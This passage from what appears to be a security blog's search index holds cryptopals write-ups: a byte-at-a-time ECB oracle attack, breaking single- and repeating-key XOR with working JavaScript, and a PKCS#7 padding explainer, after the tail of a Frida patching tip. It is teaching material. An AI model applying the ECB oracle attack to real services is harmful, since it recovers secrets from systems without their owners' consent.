${Instruction.parse(addressToOverwrite)}`); Depending on the arch, you may need to use Arm64Writer, ArmWriter, X86Writer, MipsWriter.Instruction at 0x1035158dc (BEFORE): add x0, x0, #8Instruction at 0x1035158dc (AFTER): nopReferences Frida Docs - ObjC Frida Docs - Memory Frida Docs - Arm64Writer Frida Docs - Interceptor" }, { "title": "Cryptography - Byte by Byte ECB Decryption", "url": "/posts/cryptography-byte-by-byte-ecb-decryption/", "categories": "security, cryptography", "tags": "security, cryptography, cipher, encryption, decryption, algorithm, tools", "date": "2021-12-12 18:50:23 +1000", "snippet": "In this post we’ll cover how to attack an oracle function that encrypts user supplied data concatenated with an unknown string under ECB mode while using a constant but unknown key.This post will a...", "content": "In this post we’ll cover how to attack an oracle function that encrypts user supplied data concatenated with an unknown string under ECB mode while using a constant but unknown key.This post will assume you know what PKCS#7 padding is. If you’re unsure what this is, you can read my short post about it here.This post is also a solution to challenge 12 on the cryptopals website. This site is a great resource for hands on learning about cryptography. The technique used to complete this challenge is outlined on that page. This post will explain the same technique with a bit more detail and visual examples. What are we Breaking Attack Summary Step 1 - Determining the Block Size Step 2 - Unknown String Size Step 3 - Determining the Unknown String Step 4 - Determining the Unknown String Continued What are we BreakingFor a more concrete example of what we are breaking, imagine the oracle function is a web server API such as: POST /encryptThis API would take a single parameter which is the message we want to encrypt, and would return the cipher-text. Because the key used by the server remains constant, sending the same message results in the same response.Example Request This is my message I want encryptedExample Response (HEX) 3b600a3994308f1d53879432125635deb10485748eefc86905180ff82f9a73c235b09a4c89e30328094effe8d2282edb9e2d3ccf364ba758e1395f1fcebbedc1Behind the scenes the server is doing the following: Concatenating the user supplied string with an unknown constant string (like a salt), and encrypting it with a unknown constant key. AES-ECB(user-string || unknown-constant-string, unknown-constant-key) The resulting encrypted data is sent back to the user.My claim is that we can determine exactly what unknown-constant-string is by repeated calls to this oracle function without ever knowing the encryption key!Attack SummaryStep 1 - Determining the Block SizeThe first piece of information we require is the block size, since encryption modes like ECB and CBC encrypt blocks of a fixed length. The cryptopals challenge uses AES, so we already know the block size is 16 bytes, but we’ll assume we don’t know that. The below visual examples will use a block size of 8 bytes, since it fits on the screen better. The technique is exactly the same for all block sizes.Working out the block size is very simple, we just need to do the following: Create a message 1 byte in length. Send the message to the oracle function, and store the cipher-text length. Increase the message size by 1 byte, and send the message to the oracle function. Repeat the previous step until the length of the cipher-text changes. The block size will be the final size minus the original size.Example Setup: The server is using a unknown string that is 13 bytes long (marked as XX since we don’t know what it is). We’ll use the byte 0x41 as our message, which is actually the letter A. This is arbitrary, and you can use any byte you like. After the user string is concatenated with the unknown string, the message is padded using PKCS#7 to make sure the length is a multiple of block size.Message 1 (1 Byte Message)\t\t\t41\t\tXX\t\tXX\t\tXX\t\tXX\t\tXX\t\tXX\t\tXX\t\t\t\tXX\t\tXX\t\tXX\t\tXX\t\tXX\t\tXX\t\t02\t\t02\tAfter being encrypted and returned, the length would be 16 bytes, which we store as the starting size. We add another message byte and repeat.Message 2 (2 Byte Message)\t\t\t41\t\t41\t\tXX\t\tXX\t\tXX\t\tXX\t\tXX\t\tXX\t\t\t\tXX\t\tXX\t\tXX\t\tXX\t\tXX\t\tXX\t\tXX\t\t01\tThe response is still 16 bytes long, so we add another message byte and repeat.Message 3 (3 Byte Message)\t\t\t41\t\t41\t\t41\t\tXX\t\tXX\t\tXX\t\tXX\t\tXX\t\t\t\tXX\t\tXX\t\tXX\t\tXX\t\tXX\t\tXX\t\tXX\t\tXX\t\t\t\t08\t\t08\t\t08\t\t08\t\t08\t\t08\t\t08\t\t08\tThe response size has increased to 24 bytes. We now stop, and subtract the current size from the starting size to find the block size.Block Size = 24 - 16Block Size = 8 bytesStep 2 - Unknown String SizeThis part is trivial now that we have determined the block size in the last step. We don’t even have to send any more messages to work this out.The first message we sent was 1 byte long, and the response was 16 bytes long. This means the unknown string is guaranteed to be less than 16 bytes long.We kept adding bytes to our message until the next block is added. Recall that in PKCS#7 padding, an entire block of padding is added when the plain-text length is a multiple of the block size. Look at Message 3 above, the plain-text (user-string || unknown-string) exactly filled 2 blocksBecause of this, we now know: length(user-string) + length(unknown-string) = 16 bytes length(unknown-string) = 16 bytes - length(user-string) length(unknown-string) = 16 bytes - 3 bytes length(unknown-string) = 13 bytesThe 16 bytes comes from the response length in Message 1. The 3 bytes comes from the length of our message when the response size increased.Perfect, with just a little Math we know the length of the unknown string is 13 bytes!Now let’s get to decrypting what unknown string is.Step 3 - Determining the Unknown StringOur first step to finding the unknown string is to create a piece of plain-text that is bigger than the unknown string.Since the unknown string is 13 bytes long, we’ll add enough extra bytes until it’s a multiple of the block size. Our plain-text will be 16 bytes long, since 16 is a multiple of 8 (block size), and is bigger than 13 (unknown string size).The message we’ll send is 16 repeated bytes (we’ll use 0x41 again). If we send said message to the server, we know that it would look like this after the unknown string and padding is added:\t\t\t41\t\t41\t\t41\t\t41\t\t41\t\t41\t\t41\t\t41\t\t\t\t41\t\t41\t\t41\t\t41\t\t41\t\t41\t\t41\t\t41\t\t\t\tXX\t\tXX\t\tXX\t\tXX\t\tXX\t\tXX\t\tXX\t\tXX\t\t\t\tXX\t\tXX\t\tXX\t\tXX\t\tXX\t\t03\t\t03\t\t03\tThe only block of plain-text and cipher-text we’ll really be looking at is what block number the final block of plain-text is. Since we sent 2 blocks of plain-text, we’ll only be interested in the 2nd block of cipher-text. If we had sent 30 blocks of plain-text, we’d only focus on the 30th block of cipher-text.Okay, now the fun stuff. Observe what we happen if we were to remove a single byte of our message. The first byte of the unknown string is now the last byte in block 2 (the highlighted row):\t\t\t41\t\t41\t\t41\t\t41\t\t41\t\t41\t\t41\t\t41\t\t\t\t41\t\t41\t\t41\t\t41\t\t41\t\t41\t\t41\t\tXX\t\t\t\tXX\t\tXX\t\tXX\t\tXX\t\tXX\t\tXX\t\tXX\t\tXX\t\t\t\tXX\t\tXX\t\tXX\t\tXX\t\t04\t\t04\t\t04\t\t04\tHow do we determine what that unknown byte is? By brute force!A byte can only be 256 possible values. So we’ll send 256 messages, each with a different value in the final position of block 2.Message 1 would look like this:\t\t\t41\t\t41\t\t41\t\t41\t\t41\t\t41\t\t41\t\t41\t\t\t\t41\t\t41\t\t41\t\t41\t\t41\t\t41\t\t41\t\t00\t\t\t\tXX\t\tXX\t\tXX\t\tXX\t\tXX\t\tXX\t\tXX\t\tXX\t\t\t\tXX\t\tXX\t\tXX\t\tXX\t\tXX\t\t03\t\t03\t\t03\tMessage 2 would look like this:\t\t\t41\t\t41\t\t41\t\t41\t\t41\t\t41\t\t41\t\t41\t\t\t\t41\t\t41\t\t41\t\t41\t\t41\t\t41\t\t41\t\t01\t\t\t\tXX\t\tXX\t\tXX\t\tXX\t\tXX\t\tXX\t\tXX\t\tXX\t\t\t\tXX\t\tXX\t\tXX\t\tXX\t\tXX\t\t03\t\t03\t\t03\t…Message 256 would look like this:\t\t\t41\t\t41\t\t41\t\t41\t\t41\t\t41\t\t41\t\t41\t\t\t\t41\t\t41\t\t41\t\t41\t\t41\t\t41\t\t41\t\tFF\t\t\t\tXX\t\tXX\t\tXX\t\tXX\t\tXX\t\tXX\t\tXX\t\tXX\t\t\t\tXX\t\tXX\t\tXX\t\tXX\t\tXX\t\t03\t\t03\t\t03\tFor each of the 256 messages, we store the cipher-text value of block 2 (the highlighted row) along with the byte that was added in a lookup table.Now let’s send the earlier message with 1 byte less than a full block:\t\t\t41\t\t41\t\t41\t\t41\t\t41\t\t41\t\t41\t\t41\t\t\t\t41\t\t41\t\t41\t\t41\t\t41\t\t41\t\t41\t\tXX\t\t\t\tXX\t\tXX\t\tXX\t\tXX\t\tXX\t\tXX\t\tXX\t\tXX\t\t\t\tXX\t\tXX\t\tXX\t\tXX\t\t04\t\t04\t\t04\t\t04\tWe can now get the cipher-text value of block 2, perform a lookup in our table, and see what byte is required to produce said cipher-text. It turns out it was 0x53.We’ve just discovered the first byte of the unknown string, let’s find more!Step 4 - Determining the Unknown String ContinuedWe’ve found the first byte, 1 down, 12 to go. We just need to rinse and repeat.For the second byte, we first remove another byte of our message so that the first two bytes of the unknown string are in block 2:\t\t\t41\t\t41\t\t41\t\t41\t\t41\t\t41\t\t41\t\t41\t\t\t\t41\t\t41\t\t41\t\t41\t\t41\t\t41\t\t53\t\tXX\t\t\t\tXX\t\tXX\t\tXX\t\tXX\t\tXX\t\tXX\t\tXX\t\tXX\t\t\t\tXX\t\tXX\t\tXX\t\t05\t\t05\t\t05\t\t05\t\t05\tSince we know the first byte of the unknown string, there are again only 256 possible values for the final byte. So let’s brute force again and create another lookup table. From now on we’ll be appending the recovered unknown string bytes to the end of our plain-text when doing the brute forcing.\t\t\t41\t\t41\t\t41\t\t41\t\t41\t\t41\t\t41\t\t41\t\t\t\t41\t\t41\t\t41\t\t41\t\t41\t\t41\t\t53\t\t00\t\t\t\tXX\t\tXX\t\tXX\t\tXX\t\tXX\t\tXX\t\tXX\t\tXX\t\t\t\tXX\t\tXX\t\tXX\t\tXX\t\tXX\t\t03\t\t03\t\t03\t\t\t\t41\t\t41\t\t41\t\t41\t\t41\t\t41\t\t41\t\t41\t\t\t\t41\t\t41\t\t41\t\t41\t\t41\t\t41\t\t53\t\t01\t\t\t\tXX\t\tXX\t\tXX\t\tXX\t\tXX\t\tXX\t\tXX\t\tXX\t\t\t\tXX\t\tXX\t\tXX\t\tXX\t\tXX\t\t03\t\t03\t\t03\tWith the new lookup table built, we can send our plain-text message (with no unknown string bytes added), extract block 2 of the cipher-text, and perform a lookup to see what byte produced that cipher-text:\t\t\t41\t\t41\t\t41\t\t41\t\t41\t\t41\t\t41\t\t41\t\t\t\t41\t\t41\t\t41\t\t41\t\t41\t\t41\t\t53\t\tXX\t\t\t\tXX\t\tXX\t\tXX\t\tXX\t\tXX\t\tXX\t\tXX\t\tXX\t\t\t\tXX\t\tXX\t\tXX\t\t05\t\t05\t\t05\t\t05\t\t05\tIt turns out the second byte was 0x65.Awesome, 2 bytes down 11 to go. This step is just rinse and repeat until all the unknown string bytes are found.Finishing UpAfter repeating Step 4 eleven more times, we’ve found our unknown string for our example. It turns out it was SecretStuff@1.Using this exact technique on the challenge cipher-text yielded the following unknown string.Rollin' in my 5.0With my rag-top down so my hair can blowThe girlies on standby waving just to say hiDid you stop? No, I just drove bySome final notes: We recovered this string without knowledge of the encryption key. This attack was not on the underlying cipher, it was against the cipher mode. AES is just as vulnerable to this attack as DES. This attack scales linearly O(N) and takes (256 * N) oracle function calls to complete, where N is the length of the unknown string. This could be lowered if you assumed/guessed the unknown string is only printable ASCII chars. Checkout the cryptopals website if you want to solve more problems like this and learn more about cryptography." }, { "title": "Cryptography - Breaking Repeating Key XOR Encryption", "url": "/posts/cryptography-breaking-repeating-xor-key-encryption/", "categories": "security, cryptography", "tags": "security, cryptography, cipher, encryption, decryption, algorithm, tools", "date": "2021-12-11 07:24:02 +1000", "snippet": "In this post we’ll cover how to decrypt messages that have been XOR encrypted using a repeated key, such as 84 d2 7a 09. The method we’ll be using to break the encryption uses statistics (letter fr...", "content": "In this post we’ll cover how to decrypt messages that have been XOR encrypted using a repeated key, such as 84 d2 7a 09. The method we’ll be using to break the encryption uses statistics (letter frequencies and use of common words, bigrams, and trigrams), so the cipher-text needs to be a decent size otherwise it won’t work. The key used can be any arbitrary number of bytes long, but in general, the shorter the easy it is to break.This technique requires you to know how to break single byte XOR encryption. If you’re unsure how to do that, please see my post about it here.This post is also a solution to challenge 6 on the cryptopals website. This site is a great resource for hands on learning about cryptography. The technique used to complete this challenge is outlined on that page. This post will explain the same technique with a bit more detail and visual examples. Repeating Key XOR Encryption Example Summary How to Break it - Step 1 How to Break it - Step 2 How to Break it - Step 3 ResultsRepeating Key XOR Encryption ExampleKey (4 Byte Length)\t\t\t84\t\td2\t\t7a\t\t09\t\t\t\t\t\t\t\t\tPlain-TextThis is the HEX representation of “ABCDEFGH”:\t\t\t41\t\t42\t\t43\t\t44\t\t45\t\t46\t\t47\t\t48\tEncryptionXOR the Plain-Text with key\t\t\t41 ⊕ 84\t\t42 ⊕ d2\t\t43 ⊕ 7a\t\t44 ⊕ 09\t\t45 ⊕ 84\t\t46 ⊕ d2\t\t47 ⊕ 7a\t\t48 ⊕ 09\tCipher-Text\t\t\tc5\t\t90\t\t39\t\t4d\t\tc1\t\t94\t\t3d\t\t41\tSummaryAs previously mentioned, we’ll use statistics to break the encryption. Because of this, very short cipher-texts such as the example above will not be able to be broken using this method.The steps we’ll use to break the encryption are as follows: Find the key length, we’ll call this length KEYSIZE. Split the cipher-text into KEYSIZE length sections, and create KEYSIZE different blocks where block 1 contains the 1st byte of every section, block 2 contains the 2nd byte of every section etc. Find the key for each block by performing single byte key XOR decryption.Let’s get into some more detail on each step.How to Break it - Step 1To find the key length, we’ll use some brute force and statistics. We don’t know the KEYSIZE, so we’ll guess that it’s from between 2 and 40 bytes long.For each KEYSIZE we’ll take the first KEYSIZE worth of bytes, and the second KEYSIZE worth of bytes and find the hamming distance between them. We’ll then normalise this value by dividing by KEYSIZE. This should be repeated multiple times and the average taken. That is, do the same process with the second KEYSIZE worth of bytes, and the third KEYSIZE worth of bytes. Then the 3rd and 4th, 4th and 5th etc.The KEYSIZE with the lowest normalised hamming distance should be the KEYSIZE.Let’s show an example for a KEYSIZE of 2. Below is the first 8 bytes of cipher-text:\t\t\t1d\t\t42\t\t1f\t\t4d\t\t0b\t\t0f\t\t02\t\t1f\tWe need to find the hamming distance between block 1 0x1d42 and block 2 0x1f4d, which is 5. We then need to divide this by KEYSIZE to normalise it. So we are left with 5/2 = 2.5.We repeat this with block 2 0x1f4d and block 3 0x0b0f, which is 4. 4/2 = 2.Then again with block 3 0x0b0f and block 4 0x021f, which is 3. 3/2 = 1.5.We can repeat this as many times as we like if we have more cipher-text. Since we did it 3 times above, we need to add the 3 results together and divide by 3 to get the average hamming distance:(2.5 + 2 + 1.5) / 3 = 2We have completed the step for a KEYSIZE of 2. We need to repeat all of this for each KEYSIZE (2-40).The KEYSIZE with the lowest normalised hamming distance should be correct, but it’s not guaranteed. We’ll take the top performing KEYSIZEs and continue with the next step.How to Break it - Step 2We’ll now convert the problem into a series of single byte XOR encryption problems. Here’s how to do that.Let’s say that after Step 1 we think the KEYSIZE is 5. We’ll split the cipher-text into KEYSIZE length sections, and then we’ll create KEYSIZE number of blocks.The first byte of each section goes into block 1. The second byte of each section goes into block 2. The third byte of each section goes into block 3 etc.Here is how that would look visually with the first 16 bytes of cipher-text:\t\t\t1d\t\t42\t\t1f\t\t4d\t\t0b\t\t0f\t\t02\t\t1f\t\t\t\t4f\t\t13\t\t4e\t\t3c\t\t1a\t\t69\t\t65\t\t1f\tBlock 1 (1st byte of each section)\t\t\t1d\t\t0f\t\t4e\t\t1f\t\t\t\t\t\t\t\t\tBlock 2 (2nd byte of each section)\t\t\t42\t\t02\t\t3c\t\t\t\t\t\t\t\t\t\t\tBlock 3 (3rd byte of each section)\t\t\t1f\t\t1f\t\t1a\t\t\t\t\t\t\t\t\t\t\tBlock 4 (4th byte of each section)\t\t\t4d\t\t4f\t\t69\t\t\t\t\t\t\t\t\t\t\tBlock 5 (5th byte of each section)\t\t\t0b\t\t13\t\t65\t\t\t\t\t\t\t\t\t\t\tWe’re now ready to find the key.How to Break it - Step 3For each of the blocks in Step 2, we’ll break them as if they are single byte key XOR encrypted, which if we have the right KEYSIZE, they are. After doing so, let’s say we get the following results: Block 1 Key = 69 Block 2 Key = 20 Block 3 Key = 69 Block 4 Key = 6e Block 5 Key = 69Our final decryption key would be the concatenation of all these, so it would be 69 20 69 6e 69.Back at the end of Step 1 we said we didn’t know for sure what the KEYSIZE was, only that we had a good idea. For each of the best performing KEYSIZEs, we do Step 2 &amp; 3. This will give a decryption key for each of the KEYSIZEs.To find out which one is most likely to be correct, we decrypt the cipher-text using each decryption key, then score the results based on how English it is. Scoring English was covered in the breaking single byte XOR key encryption, and the exact same method is used here.And that’s all there is to it! You now know how to break repeated key XOR encryption. As a side note, Step 1 isn’t technically necessary as it only serves to reduce the amount of computation done in the subsequent steps.ResultsUsing this exact technique on the challenge cipher-text yielded the following results.The best performing KEYSIZEs were: KEYSIZE of 2 (Hamming Distance: 2) KEYSIZE of 3 (Hamming Distance: 2.66) KEYSIZE of 29 (Hamming Distance: 2.79) KEYSIZE of 5 (Hamming Distance: 2.79) KEYSIZE of 18 (Hamming Distance: 2.94)English scores after doing Steps 2 &amp; 3 with each of the above KEYSIZEs: KEYSIZE of 29 (English Score: 4782) KEYSIZE of 18 (English Score: 1768) KEYSIZE of 2 (English Score: 1727) KEYSIZE of 5 (English Score: 1697) KEYSIZE of 3 (English Score: 1670)A KEYSIZE of 29 was clearly the winner when it came to English scoring. Here is that decrypted cipher-text using the discovered 29 byte key:[+] Best Key Length: 29[+] Key: &lt;Buffer 54 65 72 6d 69 6e 61 74 6f 72 20 58 3a 20 42 72 69 6e 67 20 74 68 65 20 6e 6f 69 73 65&gt;I'm back and I'm ringin' the bellA rockin' on the mike while the fly girls yellIn ecstasy in the back of meWell that's my DJ Deshay cuttin' all them Z'sHittin' hard and the girlies goin' crazyVanilla's on the mike, man I'm not lazy.I'm lettin' my drug kick inIt controls my mouth and I beginTo just let it flow, let my concepts goMy posse's to the side yellin', Go Vanilla Go!Smooth 'cause that's the way I will beAnd if you don't give a damn, thenWhy you starin' at meSo get off 'cause I control the stageThere's no dissin' allowedI'm in my own phaseThe girlies sa y they love me and that is okAnd I can dance better than any kid n' playStage 2 -- Yea the one ya' wanna listen toIt's off my head so let the beat play throughSo I can funk it up and make it sound good1-2-3 Yo -- Knock on some woodFor good luck, I like my rhymes atrociousSupercalafragilisticexpialidociousI'm an effect and that you can betI can take a fly girl and make her wet.I'm like Samson -- Samson to DelilahThere's no denyin', You can try to hangBut you'll keep tryin' to get my styleOver and over, practice makes perfectBut not if you're a loafer.You'll get nowhere, no place, no time, no girlsSoon -- Oh my God, homebody, you probably eatSpaghetti with a spoon! Come on and say it!VIP. Vanilla Ice yep, yep, I'm comin' hard like a rhinoIntoxicating so you stagger like a winoSo punks stop trying and girl stop cryin'Vanilla Ice is sellin' and you people are buyin''Cause why the freaks are jockin' like Crazy GlueMovin' and groovin' trying to sing alongAll through the ghetto groovin' this here songNow you're amazed by the VIP posse.Steppin' so hard like a German NaziStartled by the bases hittin' groundThere's no trippin' on mine, I'm just gettin' downSparkamatic, I'm hangin' tight like a fanaticYou trapped me once and I thought thatYou might have itSo step down and lend me your ear'89 in my time! You, '90 is my year.You're weakenin' fast, YO! and I can tell itYour body's gettin' hot, so, so I can smell itSo don't be mad and don't be sad'Cause the lyrics belong to ICE, You can call me DadYou're pitchin' a fit, so step back and endureLet the witch doctor, Ice, do the dance to cureSo come up close and don't be squareYou wanna battle me -- Anytime, anywhereYou thought that I was weak, Boy, you're dead wrongSo come on, everybody and sing this songSay -- Play that funky music Say, go white boy, go white boy goplay that funky music Go white boy, go white boy, goLay down and boogie and play that funky music till you die.Play that funky music Come on, Come on, let me hearPlay that funky music white boy you say it, say itPlay that funky music A little louder nowPlay that funky music, white boy Come on, Come on, Come onPlay that funky music" }, { "title": "Cryptography - Breaking Single Byte XOR Encryption", "url": "/posts/cryptography-breaking-single-byte-xor-encryption/", "categories": "security, cryptography", "tags": "security, cryptography, cipher, encryption, decryption, algorithm, tools", "date": "2021-12-06 07:24:02 +1000", "snippet": "In this post we’ll cover how to decrypt messages that have been XOR encrypted using a single byte key, such as b7. While this might not sound that useful, it’s a pre-cursor to breaking XOR encrypti...", "content": "In this post we’ll cover how to decrypt messages that have been XOR encrypted using a single byte key, such as b7. While this might not sound that useful, it’s a pre-cursor to breaking XOR encryption that uses a repeating key, such as 84 d2 7a 09 4c.This post is also a solution to challenge 3 on the cryptopals website. This site is a great resource for hands on learning about cryptography. The technique used to complete this challenge is outlined on that page. This post will explain the same technique with a bit more detail and examples. How to Break it English Scoring Brute Forcing the Key What Next?How to Break itSince the key is only a single byte, the keyspace is very small, only 256 possible keys. As such, brute force is practical and reasonable solution.We still need to determine which key is actually correct though. We’re assuming that the plain-text we are recovering is English text. After attempting decryption with a key, we’ll need a method to “score” the decrypted data based on how English it is.English ScoringLet’s start off by writing a function that can score a String based on how English it is.We’ll give a String points for the following: +2 Points for each occurrence of the 6 most common English characters (and space) +1 Point for each occurrence of the next 6 most common English characters +1 Point for each occurrence of the 20 most common English Bigrams +1 Point for each occurrence of the 20 most common English Trigrams +1 Point for each occurrence of the 298 most common English WordsThe String’s score will be the sum of these points.// Source: https://preply.com/en/blog/300-most-common-english-words/let commonEnglishWords = `is,be,do,go,am,he,an,up,so,no,of,to,in,on,at,by,it,he,we,my,me,us,as,or,if,was,are,had,can,use,has,see,did,get,may,say,set,put,ask,try,add,saw,got,run,eat,let,cut,way,day,man,boy,end,men,air,eye,car,sea,one,all,two,new,old,any,big,own,few,not,how,out,now,too,why,off,far,for,you,his,she,her,him,who,its,our,and,but,have,were,said,will,make,like,look,been,call,find,come,made,take,know,live,give,help,tell,came,want,show,does,must,went,read,need,move,play,keep,turn,seem,open,walk,grow,took,hear,stop,miss,talk,word,time,part,work,year,back,name,line,farm,land,home,hand,page,food,tree,city,head,life,side,feet,mile,book,idea,face,girl,list,song,each,many,some,more,long,most,good,mean,same,even,such,kind,high,left,next,hard,both,four,when,then,only,very,just,much,also,well,here,away,near,last,once,soon,with,from,into,down,over,that,they,this,what,your,them,than,it’s,would,write,could,think,spell,found,study,learn,start,might,close,begin,began,carry,watch,being,leave,water,sound,place,thing,house,point,world,plant,earth,story,paper,group,night,river,state,other,great,right,three,small,large,still,every,light,white,above,young,there,first,where,again,below,never,often,later,about,after,under,along,until,which,their,these,those,while,don’t,follow,change,should,number,people,animal,letter,mother,answer,school,father,Indian,family,little,second,enough,before,around,always,really,almost,thought,picture,America,country,example,another,through,between,without,because,sentence,children,mountain,together,different,important,sometimes,something`;commonEnglishWords = commonEnglishWords.split(',').map(word =&gt; Buffer.from(word, 'utf-8'));// Source: https://www3.nd.edu/~busiforc/handouts/cryptography/Letter%20Frequencies.htmllet mostCommonEnglishLettersPrimary = new Map();let mostCommonEnglishLettersSecondary = new Map();'etaoin '.split('').forEach(char =&gt; mostCommonEnglishLettersPrimary.set(char.charCodeAt(), true));'shrdlu'.split('').forEach(char =&gt; mostCommonEnglishLettersSecondary.set(char.charCodeAt(), true));// Source: https://www3.nd.edu/~busiforc/handouts/cryptography/Letter%20Frequencies.htmllet commonEnglishBigrams = `th,he,in,er,an,re,nd,on,en,at,ou,ed,ha,to,or,it,is,hi,es,ng`;let commonEnglishTrigrams = `the,and,ing,her,hat,his,tha,ere,for,ent,ion,ter,was,you,ith,ver,all,wit,thi,tio`;commonEnglishBigrams = commonEnglishBigrams.split(',').map(word =&gt; Buffer.from(word, 'utf-8'));commonEnglishTrigrams = commonEnglishTrigrams.split(',').map(word =&gt; Buffer.from(word, 'utf-8'));// Returns an positive Integer score based on how English the input Buffer isconst scoreDecryptedBuffer = (decipheredBuffer) =&gt; {\tlet commonWordMatches = 0;\tlet commonBigramMatches = 0;\tlet commonTrigramMatches = 0;\tlet commonLetterMatches = 0;\t// Detect how many occurrences of the most common English Words there are.\tcommonEnglishWords.forEach(commonWord =&gt; {\t\tcommonWordMatches += countOccurrences(decipheredBuffer, commonWord);\t});\t// Detect how many occurrences of the most common English Bigrams there are.\tcommonEnglishBigrams.forEach(commonBigram =&gt; {\t\tcommonBigramMatches += countOccurrences(decipheredBuffer, commonBigram);\t});\t// Detect how many occurrences of the most common English Trigrams there are.\tcommonEnglishTrigrams.forEach(commonTrigram =&gt; {\t\tcommonTrigramMatches += countOccurrences(decipheredBuffer, commonTrigram);\t});\t// Detect how many occurrences of the most common English letters there are.\t// The 6 most common letters (and space) get +2 score, the next 6 most common get +1 score.\tdecipheredBuffer.forEach(byte =&gt; {\t\tif (mostCommonEnglishLettersPrimary.has(byte)) commonLetterMatches += 2;\t\telse if (mostCommonEnglishLettersSecondary.has(byte)) commonLetterMatches += 1;\t});\treturn commonWordMatches + commonBigramMatches + commonTrigramMatches + commonLetterMatches;}// Count how many occurrences of a Buffer occur within a target Bufferconst countOccurrences = (targetBuffer, toSearchForBuffer) =&gt; {\tlet occurrences = 0;\tlet currentOccurrenceIndex = targetBuffer.indexOf(toSearchForBuffer);\twhile (currentOccurrenceIndex !== -1) {\t\toccurrences++;\t\tcurrentOccurrenceIndex = targetBuffer.indexOf(toSearchForBuffer, currentOccurrenceIndex+1);\t}\treturn occurrences;}Scoring Examplelet englishText = Buffer.from('This is a test string that will be scored on how english it is', 'utf-8');let randomBytes = [];for (let i = 0; i &lt; 64; ++i) {\trandomBytes.push(Math.floor(Math.random()*256));}console.log('Score for English Text:', scoreDecryptedBuffer(englishText));console.log('Score for Random Bytes:', scoreDecryptedBuffer(Buffer.from(randomBytes)));Score for English Text: 129Score for Random Bytes: 4Brute Forcing the KeyNow that we can score a given String on how English it is, we can brute force the key.As the key is only one byte, there is 256 possible keys to check. For each key we will decrypt the cipher-text with it, and score the decrypted string. The key that produces the best score is most likely to be the correct key.// Perform single byte XOR decryption on a given Cipher-Text Bufferconst singleXorKeyDecryption = (cipherTextBuffer) =&gt; {\tlet bestScore = { score: 0, key: -1 };\tlet decryptionBuffer = Buffer.alloc(cipherTextBuffer.length);\tlet tempScore;\t// Brute force all 256 possible keys\tfor (decryptionKey = 0; decryptionKey &lt; 256; ++decryptionKey) {\t\t// Decrypt the Cipher-Text using the current decryption key and store results in the decryption Buffer\t\tfor (let i = 0; i &lt; cipherTextBuffer.length; ++i) {\t\t\tdecryptionBuffer[i] = cipherTextBuffer[i] ^ decryptionKey;\t\t}\t\t// Score the decrypted Cipher-Text\t\ttempScore = scoreDecryptedBuffer(decryptionBuffer);\t\t// If this key scored best, store it\t\tif (tempScore &gt; bestScore.score) {\t\t\tbestScore.score = tempScore;\t\t\tbestScore.key = decryptionKey;\t\t}\t}\t// Decrypt the Cipher-Text using the best scoring decryption key and store results in the decryption Buffer\tfor (let i = 0; i &lt; cipherTextBuffer.length; ++i) {\t\tdecryptionBuffer[i] = cipherTextBuffer[i] ^ bestScore.key;\t}\t// Return the best key, and the Cipher-Text decrypted with that key\treturn {\t\tdata: decryptionBuffer,\t\tkey: bestScore.key,\t\tscore: bestScore.score\t};}With this latest function we can call it with our cipher-text as input. The cipher-text used is from here.let cipherText = Buffer.from('1b37373331363f78151b7f2b783431333d78397828372d363c78373e783a393b3736', 'hex');let decryptionResults = singleXorKeyDecryption(cipherText);console.log('\\nMost Likely Decryption Key:');console.log(Buffer.from([decryptionResults.key]));console.log('\\nDecrypted Data:');console.log(decryptionResults.data);console.log(decryptionResults.data.toString('utf-8'));Putting everything together, we can now decrypt our cipher-text:Most Likely Decryption Key:&lt;Buffer 58&gt;Decrypted Data:&lt;Buffer 43 6f 6f 6b 69 6e 67 20 4d 43 27 73 20 6c 69 6b 65 20 61 20 70 6f 75 6e 64 20 6f 66 20 62 61 63 6f 6e&gt;Cooking MC's like a pound of baconWhat Next?While this function might not seem that useful at first, it will be vital when we want to break repeating key XOR encryption.If you want to learn how to do that, you can read how to here." }, { "title": "Cryptography - PKCS#7 Padding", "url": "/posts/cryptography-pkcs-7-padding/", "categories": "security, cryptography", "tags": "security, cryptography, encryption, decryption, algorithm, pkcs", "date": "2021-12-03 00:06:44 +1000", "snippet": "This post will show how PKCS#7 Padding works for block ciphers like DES and AES. This post includes visual examples and the edge case to be aware of. PKCS#7, which includes message padding, is defi...", "content": "This post will show how PKCS#7 Padding works for block ciphers like DES and AES. This post includes visual examples and the edge case to be aware of. PKCS#7, which includes message padding, is defined in RFC 5652. What It’s For Examples Edge CaseWhat It’s ForPadding is used in certain block cipher modes (like ECB and CBC) when the plain-text needs to be a multiple of the block size. If we are using a 16 byte block cipher, but our plain-text is only 9 bytes, then we need to pad out our data with 7 additional bytes.To do this we append 7 bytes all with the value of 0x07. The general case is if we need to add N bytes to make a full block, we append N bytes each with a value of N. This works only if the block size is less than 256 bytes, since a byte can only be a value between 0 and 255. See examples below for 8 byte blocks:ExamplesExample 1Before Padding (3 Bytes)\t\t\t58\t\tb3\t\ta9\t\t\t\t\t\t\t\t\t\t\tAfter Padding (8 Bytes)\t\t\t58\t\tb3\t\ta9\t\t05\t\t05\t\t05\t\t05\t\t05\tExample 2Before Padding (14 Bytes)\t\t\tc3\t\t07\t\t4b\t\tb2\t\tb4\t\t9f\t\t5b\t\ta9\t\t\t\ta6\t\t0b\t\t51\t\t30\t\t6d\t\t2c\t\t\t\t\tAfter Padding (16 Bytes)\t\t\tc3\t\t07\t\t4b\t\tb2\t\tb4\t\t9f\t\t5b\t\ta9\t\t\t\ta6\t\t0b\t\t51\t\t30\t\t6d\t\t2c\t\t02\t\t02\tEdge CaseThe edge case to be aware of is when the plain-text length is a multiple of the block size. I.e. if the block size is 8, and the plain-text is of size 8, 16, 24, etc. In this case, padding still needs to be added to avoid confusion.If no padding was added, and the plain-text ends with 02 02 or 01, that data would be striped away as it would look like padding.If the plain-text is a multiple of the block size B, then another block is added that contains the value B in all positions. Example below with a block size of 8:Before Padding (8 Bytes)\t\t\t58\t\tb3\t\ta9\t\t32\t\t07\t\t8c\t\tfd\t\t19\tAfter Padding (16 Bytes)\t\t\t58\t\tb3\t\ta9\t\t32\t\t07\t\t8c\t\tfd\t\t19\t\t\t\t08\t\t08\t\t08\t\t08\t\t08\t\t08\t\t08\t\t08\t" }, { "title": "BaseN Converter", "url": "/posts/basen-converter/", "categories": "tools", "tags": "tools, security, cryptography, algorithm, cipher", "date": "2021-11-30 18:22:14 +1000", "snippet": "This tool can convert from UTF-8 strings to BaseN (any arbitrary base). It can also convert from BaseN to UTF-8 or HEX. The conversion alphabet can also be specified for these conversions as well. 